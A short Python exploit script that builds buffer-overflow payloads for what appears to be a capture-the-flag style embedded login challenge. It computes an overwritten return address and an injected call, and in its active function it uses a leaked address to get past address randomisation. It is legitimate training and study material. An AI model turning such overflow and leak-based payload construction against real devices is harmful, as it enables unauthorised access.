# arr = [0x55, 0x73, 0x65, 0x72, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x28, 0x38, 0x20, 0x63, 0x68, 0x61, 0x72, 0x20, 0x6d, 0x61, 0x78, 0x29, 0x3a]
# arr = [0xa, 0x50, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x3a, 0x0]
# #arr = [0x57, 0x72, 0x6f, 0x6e, 0x67, 0x21]
# for i in arr:
#     print(chr(i),end='')

# print()

def swap(str):
    return str[2:] + str[:2]

def generate_payload(addr_1,addr_2):
    ret_addr = hex((addr_1 - (0xffe&addr_2)+0xff00 - 0x2)&0xffff)[2:]
    add_int = hex(0x48ec-0x4400+addr_1)[2:]
    print('42'*8+swap(ret_addr)+'30127f00b012'+swap(add_int))

def generate_payload_with_leaked_addr(leak_add):
    addr_r11 =  swap(hex(leak_add-0x36a + 0x4544 - 0x4400)[2:])
    print('42'*6+'7f00'+addr_r11)
#generate_payload(0x8e2e,0xcdc8)

generate_payload_with_leaked_addr(0x7b18)

